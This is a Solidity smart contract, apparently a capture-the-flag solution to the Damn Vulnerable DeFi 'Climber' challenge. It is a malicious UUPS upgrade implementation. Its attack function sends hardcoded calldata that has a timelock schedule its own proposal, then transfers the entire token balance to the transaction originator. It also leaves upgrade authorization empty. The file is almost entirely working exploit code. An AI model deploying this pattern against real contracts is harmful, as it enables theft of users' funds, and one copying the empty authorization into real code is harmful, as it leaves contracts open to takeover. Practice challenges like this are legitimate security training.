// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract ClimberAttacker is UUPSUpgradeable {
    // this is the mal imp of the UUPS
    constructor() {}

    function attack(address token) external {
        // the msg.sender must be the timelock
        // schedule propose
        bytes memory callData = hex"90bd1e6d000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000180bb196860dcc06613a15f0b5d72039950047c3143fe44531bd14554b78f8a3a9a0000000000000000000000000000000000000000000000000000000000000003000000000000000000000000cafac3dd18ac6c6e92c921884f9e4176737c052c000000000000000000000000cafac3dd18ac6c6e92c921884f9e4176737c052c000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000000002424adbc5b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000442f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f05120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a44f1ef286000000000000000000000000057ef64e23666f000b34ae31332854acbd1c854400000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000024d018db3e0000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        (bool success,) = msg.sender.call(callData);
        require(success, "schedule failed");

        // transfer all token
        IERC20(token).transfer(tx.origin, IERC20(token).balanceOf(address(this)));
    }

    // empty imp
    function _authorizeUpgrade(address) internal override {}
}
